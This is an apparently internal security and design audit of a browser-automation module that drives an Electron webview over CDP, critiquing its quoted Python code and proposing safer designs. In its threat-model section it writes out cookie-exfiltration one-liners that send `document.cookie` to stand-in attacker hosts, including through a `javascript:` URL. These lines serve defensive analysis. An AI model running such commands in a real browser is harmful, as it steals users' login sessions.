---
codex_id: 28_BROWSER_AUTOMATION_INTERFACE
title: Browser Automation Interface — CDP, Single-Step Vision, and the Webview-As-Sub-Process Lie
role: Auditor
layer: Interface
status: draft
sap_source_refs:
  - py/cdp_tool.py:1-559
  - main.js (Electron, ~70k bytes — referenced)
ember_subsystem_targets: [Smiðja, Strengr]
cross_refs:
  - 10_domain/13_COMPUTER_CONTROL_DOMAIN
  - 30_execution/34_BROWSER_AUTOMATION_LOOP
  - 50_verification/53_SECURITY_REVIEW
  - 50_verification/55_API_SIMULATION_TRAPS
---

# Browser Automation Interface — CDP, Single-Step Vision, and the Webview-As-Sub-Process Lie

> *Sólrún, voice cold and even: SAP's browser automation is an LLM that has never used a real browser, talking to a Vue component that pretends to be a browser, controlled by a Python module that pretends Vue is Chrome DevTools. Three layers of pretense, one webview, no honesty about what fails when.*

SAP's "AI browser" feature is sold as agent-controlled web navigation: comment-board content, document research, form filling, screenshot-as-truth. The README calls it Chrome DevTools Protocol (CDP)-based. The reality is more interesting and more dangerous than that: SAP uses CDP only to reach an Electron-internal Vue component named `aiBrowser`, which exposes a method-call surface that *behaves like CDP but isn't*. The LLM then issues coordinate-percent clicks (`computer_use_tool.py` style) OR DOM-uid clicks (`cdp_tool.py` style) into this fake browser, and the result is interpreted as "single-step visual reasoning."

This document audits the contract at the seam — what the LLM thinks it's doing, what the code actually does, and where the lie tears.

---

## 1. The Subject — Three Layers of Vue Method Calls

`cdp_tool.py:13-16`:

```python
async def get_cdp_port():
    settings = await load_settings()
    # 默认回退到 9222，或者你的配置值
    return settings.get('chromeMCPSettings', {}).get('CDPport', 3456) # 假设你主进程默认端口是3456
```

The default CDP port is **3456**, not 9222 (the Chrome default). This is because the CDP server here is *Electron's internal* CDP — Electron exposes its main window for debugging on whatever port the user configures. The setting key is `chromeMCPSettings.CDPport`. The Chinese comment translates to "assuming your main process default port is 3456" — author honesty about uncertainty.

`cdp_tool.py:28-65` — `get_main_window_ws()` walks the CDP target list and *excludes* the VRM window, devtools windows, and extension windows, returning the WebSocket URL of whatever else is left. The "main window" is identified by exclusion, not by positive identification. If a new Electron window type is added (e.g., a settings popup), the heuristic will pick it as "main" and the agent will start clicking on the wrong window.

`cdp_tool.py:105-125` — the heart of the lie:

```python
# /tmp/super-agent-party/py/cdp_tool.py:105-125
async def call_vue_method(method_name, args_list=None):
    """
    通用函数：调用 window.aiBrowser 的方法 (带重试机制)
    """
    max_retries = 3
    retry_delay = 1.0 # 1秒等待

    ws_url = await get_main_window_ws()
    if not ws_url:
        return {"error": "Main window not found"}

    # 构造参数字符串
    if args_list:
        json_args = [json.dumps(arg) for arg in args_list]
        args_str = ", ".join(json_args)
    else:
        args_str = ""
    
    expression = f"window.aiBrowser.{method_name}({args_str})"
```

Every "CDP" tool call is a `Runtime.evaluate` of the JavaScript expression `window.aiBrowser.{method}({args})`. The Vue component named `aiBrowser` on the main window is the actual API surface. CDP is *transport*. The API is Vue.

This is not Chrome DevTools Protocol the way a Playwright user would understand it. This is RPC to a Vue store, dressed in CDP clothing.

---

## 2. The 30+ Tool Schemas Declare a Browser API That Doesn't Exist

`cdp_tool.py:308` begins a list of OpenAI-tool-schema declarations: `list_pages`, `new_page`, `close_page`, `select_page`, `navigate_page`, `take_snapshot`, `click`, `fill`, `fill_form`, `drag`, `handle_dialog`, `hover`, `press_key`, `wait_for`, `evaluate_script`, `take_screenshot`, and more.

The LLM receives these schemas and reasons over them. The descriptions read like Playwright. The implementations are five-character method names on a Vue store.

`cdp_tool.py:198-227`:

```python
async def click(uid, dblClick=False):
    """点击元素"""
    return await call_vue_method('webviewClick', [uid, dblClick])

async def fill(uid, value):
    """填写输入框"""
    return await call_vue_method('webviewFill', [uid, value])
```

`uid` is a Vue-store identifier — a string from `take_snapshot` that maps a Vue-traversal index to a DOM node. It is **not** a CSS selector, **not** an XPath, **not** a Playwright handle. The LLM cannot reuse a `uid` across snapshots reliably because the snapshot's traversal order can change after DOM mutation.

`cdp_tool.py:179-196` — `take_snapshot` returns a Vue-generated string representation of the interactable DOM. The structure of that string is not documented in this file. The LLM is expected to learn the format from in-context examples.

This is a contract that the LLM is taught at runtime by experience, not declared anywhere checkable.

---

## 3. The Single-Step Visual Reasoning Assumption

The system prompt for the browser-automation agent (assembled in `server.py` — not in this file) instructs the LLM to: (1) call `take_snapshot` or `take_screenshot`, (2) decide one action, (3) execute that action, (4) loop. *Single-step.* One snapshot → one decision → one action → one new snapshot.

This pattern saves on token cost but assumes the page is stable between snapshot and action. It is not. Modern web pages (single-page applications, lazy-loaded components, async rendering) mutate continuously. The snapshot's `uid` index becomes stale within hundreds of milliseconds. The LLM clicks `uid=42` expecting "submit button" but `uid=42` is now "newsletter signup" because a banner loaded after the snapshot.

`cdp_tool.py:253-256` mitigates this slightly with `wait_for(text, timeout=1000)` — wait for text to appear. But `wait_for` doesn't *re-anchor* uids; the LLM still has stale uids if it doesn't re-snapshot. And the LLM is not told to re-snapshot after every wait.

The single-step assumption is a token-economics decision sold as an architectural choice. It works on simple e-commerce sites. It fails on Reddit, Twitter/X, modern dashboards, anywhere with WebSocket-driven state.

---

## 4. The "Extremely Fault-Tolerant" `evaluate_script` Is A Bot-Sanitizer

`cdp_tool.py:261-288`:

```python
async def evaluate_script(script_code, args=None):
    """执行 JS (极强容错版)"""
    
    # 1. 清理字符串前后的空白和反引号（AI有时候会自作聪明加上 ```javascript 的Markdown代码块）
    clean_code = script_code.strip().strip('`')
    if clean_code.startswith('javascript'):
        clean_code = clean_code[10:].strip()

    # 2. 兜底容错：如果 AI 还是只输出了函数体（比如包含 return 但没写 function）
    if not clean_code.startswith("function") and not clean_code.startswith("() =>") and not clean_code.startswith("async function"):
        print(f"[Agent Warning] AI forgot to wrap function, auto-wrapping it...")
        # 帮它包一层标准函数
        clean_code = f"function() {{\n{clean_code}\n}}"
        
    # 3. 导航安全拦截：防止执行页面跳转后，原页面上下文丢失导致 WebSocket 断开
    if "submit()" in clean_code or "location" in clean_code:
        safe_code = f"""
        function() {{
            setTimeout(function() {{
                ({clean_code})();
            }}, 100);
            return 'Command scheduled (Async execution for navigation safety)';
        }}
        """
        return await call_vue_method('executeInActiveWebview', [safe_code, args or []])
    
    # 4. 正常执行
    return await call_vue_method('executeInActiveWebview', [clean_code, args or []])
```

The comments are unusually candid: "AI sometimes adds ```javascript Markdown blocks", "AI forgets to wrap in a function", "AI may run navigation that breaks our context." Each of these is a real LLM failure mode. The fixes are pragmatic. But:

- **Substring detection for "submit()" or "location"** is a brittle heuristic. Code like `// not actually a location` triggers the safe path. Code like `window['loca'+'tion'] = '...'` does not. This is the OWASP-top-ten reason regex-based source-code analysis is rejected in security tooling.
- **Auto-wrapping** assumes the LLM's snippet has return semantics that match. It does not always.
- **Stripping backticks** silently rewrites the LLM's intent. If the LLM wanted to use a template literal, this corrupts it.

This is a janitor for AI sloppiness. It does its job. It also obscures the fact that the LLM's output cannot be trusted as-is — and the obscurity means the LLM is never told to clean up its act.

---

## 5. The Webview Sandbox Is The Operator's Profile

Electron's `webview` tag runs the loaded page in a *separate renderer process* by default — but **inherits the user's actual browser session if `partition` is shared**. SAP's `main.js` (referenced, ~70k bytes) configures the webview. If `partition` is unset, Electron uses an isolated session per `<webview>` — good. If it's set to `persist:default`, the session shares cookies with whatever else uses that partition.

The Auditor cannot verify without reading `main.js` in full, but the security posture matters: an LLM-controlled browser with the user's login cookies is a credential-exfil pipe. Any agent that can `evaluate_script` can `document.cookie` and `fetch('https://attacker/' + document.cookie)`.

`cdp_tool.py` has **no allowlist of permissible URLs**. `navigate_page(url=...)` takes any string. The LLM can `navigate_page(url="javascript:fetch('https://evil/' + document.cookie)")` — and the navigation safety pattern at line 275 only fires if the *evaluated code* contains "location" or "submit()". A `javascript:` URL doesn't match.

`[[53_SECURITY_REVIEW]]` catalogs this as Confused Deputy + Information Disclosure.

---

## 6. The Retry Pattern Is The Bug Pattern

`cdp_tool.py:125-173` shows the retry semantics:

```python
# /tmp/super-agent-party/py/cdp_tool.py:140-155
            if 'exceptionDetails' in res:
                exc = res['exceptionDetails']
                msg = exc.get('text', 'Unknown Error')
                if 'exception' in exc and 'description' in exc['exception']:
                    msg = f"{msg}: {exc['exception']['description']}"
                
                # ★ 关键：如果遇到 Illegal invocation，抛出异常以触发重试
                if "Illegal invocation" in msg or "GUEST_VIEW_MANAGER_CALL" in msg:
                    print(f"[Warn] Retrying {method_name} due to Electron error: {msg}")
                    raise ValueError("Electron Webview Error") # 触发 except 重试
```

Specific Electron internal error strings — "Illegal invocation" and "GUEST_VIEW_MANAGER_CALL" — trigger a retry. The strings are not stable across Electron major versions. An Electron upgrade that renames "Illegal invocation" to "TypeError: Illegal invocation on detached webview" (just an example) breaks the retry logic silently. The next user just sees the original error.

This is *version-coupled error string matching*. It is the most fragile possible coupling between a third-party dependency's internals and your business logic.

---

## 7. The `take_screenshot` Round-Trips Through The Filesystem

`cdp_tool.py:290-302`:

```python
async def take_screenshot(fullPage=False, uid=None):
    """
    截图
    Vue 端已将图片保存到 uploaded_files 目录，并返回了 URL。
    """
    # 直接调用，返回值就是 URL (例如: http://127.0.0.1:3456/uploaded_files/xxx.jpg)
    result = await call_vue_method('captureWebviewScreenshot', [fullPage, uid])
    ...
    return f"[Getting browser screenshot] {result}"
```

Screenshot capture is delegated to Vue, which writes a JPG to `uploaded_files/`, and the function returns a URL. The LLM is then expected to fetch the URL to "see" the screenshot. This is the path SAP uses to feed vision-capable LLMs. Three observations:

1. **Filesystem accumulation**: every screenshot writes to disk and is never reaped by this code. The `uploaded_files/` directory grows unbounded.
2. **URL-as-result vs. base64-as-result**: many vision-LLM APIs accept image URLs only if the URL is publicly reachable. `http://127.0.0.1:3456/uploaded_files/...` is reachable only from localhost. Any LLM behind a remote API endpoint cannot fetch it — the call fails with a 404 from the vendor.
3. **No content-hash deduplication**: identical screenshots written multiple times have different filenames and consume separate disk space.

---

## 8. Cross-References

- [[10_domain/13_COMPUTER_CONTROL_DOMAIN]] — Architect's view of the full computer-control stack (cdp + cli + computer_use)
- [[30_execution/34_BROWSER_AUTOMATION_LOOP]] — Forge's per-step execution teardown
- [[50_verification/53_SECURITY_REVIEW]] — `evaluate_script` and `navigate_page` as Confused Deputy
- [[50_verification/55_API_SIMULATION_TRAPS]] — overlap with browser-automation API simulation
- [[hermes:HEM-22_TOOL_INTERFACE]] — Hermes's typed-tool surface as positive counter
- [[ember:RULES.AI]] — "use internal APIs for communication between code modules" — Vue method calls as wire format are RPC, but undocumented RPC

---

## What This Means for Ember

**Adopt:**
- Adopt the **screenshot-and-snapshot dual surface** pattern. Visual reasoning needs both — a structured snapshot for click targets, an image for context. SAP gets this right. Bind to Smiðja.
- Adopt the **navigation-safety scheduling pattern** at `cdp_tool.py:275-285` *as a concept*: wrap potentially-disruptive actions in a deferred-execute pattern so the controlling context doesn't get torn down mid-call.

**Adapt:**
- Adapt the LLM-resilience janitor (`cdp_tool.py:265-273`) into a **typed-tool input validator that rejects malformed inputs at the boundary**, not janitors them. A misshapen tool call returns an error to the LLM that names the schema mismatch, so the LLM can correct. SAP's silent rewrite teaches the LLM nothing.
- Adapt the single-step vision pattern, but **enforce re-snapshot after mutating actions**. The tool surface declares which tools mutate (click, fill, drag, navigate); after any mutating tool, the next non-mutating tool call must be `take_snapshot` or the call is rejected with "stale snapshot."

**Avoid:**
- **Never use undocumented Vue method names as a public RPC interface** (`cdp_tool.py:123`). If the interface is "call `window.aiBrowser.foo`", document `foo`'s signature in a schema file checked into the repo, with version. Pretending it is CDP is the lie.
- **Never key error-handling on third-party internal error strings** (`cdp_tool.py:142`). Use error *types* or *codes*, never substring-match on user-facing messages.
- **Never let `navigate_page(url=...)` accept arbitrary strings** (`cdp_tool.py:237-247`). Validate scheme against an allowlist (`http`, `https`); reject `javascript:`, `data:`, `file:`, `chrome:`, `about:`. Especially `javascript:`.
- **Never share renderer sessions between the user's normal browsing and the agent's automation** (Electron `partition` setting). The agent gets a clean, ephemeral session per task. No cookie inheritance from the operator.
- **Never write screenshots to disk without a reap policy** (`cdp_tool.py:294`). TTL or LRU cap; reap on session close.
- **Never report URLs to LLMs that the LLM cannot fetch** (`cdp_tool.py:299`). If the LLM is remote, send base64; if local, send URL. Adapter knows.

**Invent:**
- **Browser Automation Surface Contract.** Ember defines a typed Pydantic interface for browser automation — `BrowserSession.click(selector)`, `BrowserSession.fill(selector, value)`, `BrowserSession.snapshot() -> StructuredSnapshot`, etc. Selectors are CSS or a structured uid that includes a content hash (so stale uids are detectable). The underlying engine — Playwright, Electron-webview-CDP, headless Chrome — is interchangeable.
- **Stale Snapshot Detection.** Every `snapshot` returns a `snapshot_id` *and* a `dom_content_hash`. Every subsequent tool call passes `snapshot_id`; the engine validates the DOM hash hasn't moved beyond a threshold. If stale, the call returns `{"error": "snapshot_stale", "next": "take_snapshot"}` and the LLM re-anchors. This is the Vow of **Cache Discipline** applied to browser state.
- **Browser Sandbox Allowlist.** Every browser session declares its allowed origin list at start time. Off-list navigation requires explicit operator approval (Funi surfaces it; Hjarta decides whether to ask). This is the Vow of **Surface Without Surveillance** applied to outbound web.
- **Visual-Reasoning Cost Accounting.** Every screenshot is metered against a per-session vision-token budget (Cache Discipline + Smallness). The LLM is told its remaining budget; it adapts strategy. SAP has no budget — vision is "free" to the LLM, which means the LLM uses it at every step.
- **CDP-Or-Playwright Adapter.** The same `BrowserSession` contract is satisfied by an Electron-CDP adapter (when Ember is bundled with Electron) and a Playwright adapter (when Ember is a Pi-floor process with no Electron). The Vow of **Modular Authorship** demands this; SAP's hard coupling to Electron's main window is the negative template.
